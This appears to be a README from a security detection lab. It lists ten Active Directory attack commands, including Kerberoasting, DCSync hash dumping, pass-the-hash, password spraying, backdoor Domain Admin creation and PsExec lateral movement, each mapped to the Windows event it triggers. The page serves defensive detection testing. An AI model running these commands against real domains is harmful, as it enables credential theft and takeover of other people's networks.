# Attack commands (Kali Linux)

> **Lab only.** Every command below was run from the Kali box (`10.0.0.8`) against the isolated
> `hackme.local` lab on a private VirtualBox NAT network (`10.0.0.0/24`) with no route to the
> internet or any other network. Running these against a domain you don't own, or don't have
> explicit written authorization to test, is illegal. `svc_sql`, `svc_lab` and `lab_dip` are
> throwaway accounts created for this lab.

Most techniques use [Impacket](https://github.com/fortra/impacket) (`pip install impacket`) and
standard AD recon tools. Replace `<password>` / `<hash>` with the lab's own credentials — none are
reused from a real environment.

## 1. Kerberoasting — T1558.003

Request a service ticket for an SPN-registered account (`svc_sql`) and crack it offline:

```bash
impacket-GetUserSPNs hackme.local/lab_dip:'<password>' -dc-ip 10.0.0.10 -request
```

Fires `win_security` EventCode 4769 for a TGS request against `svc_sql`'s SPN. Detection also
works against the raw Kerberos API without Impacket:

```powershell
Add-Type -AssemblyName System.IdentityModel
[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new("HTTP/sql.hackme.local")
```

## 2. AS-REP Roasting — T1558.004

Requires a target account with Kerberos pre-authentication disabled
(`Set-ADAccountControl -DoesNotRequirePreAuth $true`):

```bash
impacket-GetNPUsers hackme.local/ -usersfile users.txt -dc-ip 10.0.0.10 -no-pass -format hashcat
```

Fires EventCode 4768 with pre-authentication not required.

## 3. DCSync — T1003.006

Impersonates a domain controller to pull password hashes via directory replication (needs
`Replicating Directory Changes` rights, granted to `svc_lab` for this lab):

```bash
impacket-secretsdump hackme.local/svc_lab:'<password>'@10.0.0.10
```

Fires EventCode 4662 (directory replication rights used) on the DC.

## 4. Credential Dumping via Remote Registry — T1003.002

Remotely dumps the SAM/SYSTEM hives over SMB:

```bash
impacket-secretsdump -no-pass -k hackme.local/lab_dip@DESKTOP-01.hackme.local
# or, against a specific host with explicit credentials:
impacket-secretsdump hackme.local/lab_dip:'<password>'@10.0.0.4
```

Fires EventCode 5145 (remote hive/share access) on the target endpoint.

## 5. Pass-the-Hash — T1550.002

Uses a captured NTLM hash (from step 3/4) to authenticate as `Administrator` without the
plaintext password:

```bash
impacket-wmiexec -hashes :<ntlm_hash> Administrator@10.0.0.10
```

Fires EventCode 4624 (`Logon_Type=3`, `Authentication_Package=NTLM`) for Administrator.

## 6. Encoded/Download PowerShell Execution — T1059.001

Runs an obfuscated, Base64-encoded command via WMI:

```bash
impacket-wmiexec hackme.local/lab_dip:'<password>'@10.0.0.4 \
  "powershell -enc <base64_encoded_command>"
```

Fires EventCode 4104 (PowerShell Script Block Logging) on the endpoint.

## 7. Scheduled Task Persistence — T1053.005

Creates a scheduled task for persistence via `atexec`:

```bash
impacket-atexec hackme.local/lab_dip:'<password>'@10.0.0.4 "whoami"
```

Fires EventCode 4698 (scheduled task created).

## 8. Password Spraying — T1110.003

One password against many accounts, to stay under per-account lockout thresholds:

```bash
crackmapexec smb 10.0.0.10 -u users.txt -p 'Winter2026!' --continue-on-success
```

Fires EventCode 4771 (Kerberos pre-authentication failure) across multiple accounts from one
source IP.

## 9. Rogue Privileged Account Creation — T1136.002

Creates a backdoor account and adds it to Domain Admins:

```bash
net rpc user add backdoor1 'Winter2026!' -U hackme.local/lab_dip%'<password>' -S 10.0.0.10
net rpc group addmem "Domain Admins" backdoor1 -U hackme.local/lab_dip%'<password>' -S 10.0.0.10
```

Fires EventCode 4720 (account created) and 4728 (added to a privileged group) on the DC.

## 10. Lateral Movement via PsExec — T1021.002

Installs and runs a remote service to get a shell on the endpoint:

```bash
impacket-psexec hackme.local/lab_dip:'<password>'@10.0.0.4
```

Fires EventCode 7045 (service installation) with the random service/binary name pattern
`impacket-psexec` leaves behind.

## Cleanup between runs

Several of these leave state (disabled accounts, firewall rules, test accounts) — see
[`wazuh/README.md`](wazuh/README.md#rollback--cleanup) for rollback commands, and manually remove
any accounts created in step 9 (`net rpc user delete backdoor1 ...`).
